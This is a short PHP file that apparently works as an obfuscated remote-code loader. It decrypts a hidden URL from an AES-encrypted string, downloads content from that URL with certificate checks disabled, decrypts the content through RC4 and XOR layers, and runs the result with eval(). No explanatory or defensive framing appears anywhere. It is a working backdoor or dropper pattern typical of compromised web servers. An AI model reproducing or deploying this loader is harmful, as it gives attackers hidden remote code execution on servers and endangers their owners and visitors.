<?php
$key="dsv78si";
$enc_url="UkhOc3hyS0U4WWF0NUVzMndnSW94bFE4cldHdE90azBpclF0WXlFbGV2ZEZGMlIzTzZYVzVJZ0ZhV1lmZ2NOaQ==";

function simple_dec($data,$key){
    return openssl_decrypt(base64_decode($data),"AES-128-ECB",sha1($key));
}

$url=simple_dec($enc_url,$key);

function fetch($u){
    if(function_exists("curl_init")){
        $ch=curl_init($u);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
        curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
        return curl_exec($ch);
    }elseif(ini_get("allow_url_fopen")){
        return file_get_contents($u);
    }else{
        $p=parse_url($u);$fp=fsockopen($p["host"],80);
        fputs($fp,"GET ".$p["path"]." HTTP/1.0\r\nHost:".$p["host"]."\r\n\r\n");
        $res="";while(!feof($fp))$res.=fgets($fp);fclose($fp);
        return substr($res,strpos($res,"\r\n\r\n")+4);
    }
}

function rc4($k,$d){
    $s=range(0,255);$j=0;$o="";
    for($i=0;$i<256;$i++){
        $j=($j+$s[$i]+ord($k[$i%strlen($k)]))%256;
        list($s[$i],$s[$j])=[$s[$j],$s[$i]];
    }$i=$j=0;
    for($y=0;$y<strlen($d);$y++){
        $i=($i+1)%256;$j=($j+$s[$i])%256;
        list($s[$i],$s[$j])=[$s[$j],$s[$i]];
        $o.=$d[$y]^chr($s[($s[$i]+$s[$j])%256]);
    }return $o;
}

$d=fetch($url);
if(!$d)exit("Failed fetch");
$xk=sha1($key);$rd=rc4($key,base64_decode($d));
$f="";for($i=0;$i<strlen($rd);$i++)
    $f.=$rd[$i]^$xk[$i%strlen($xk)];

eval("?>".$f);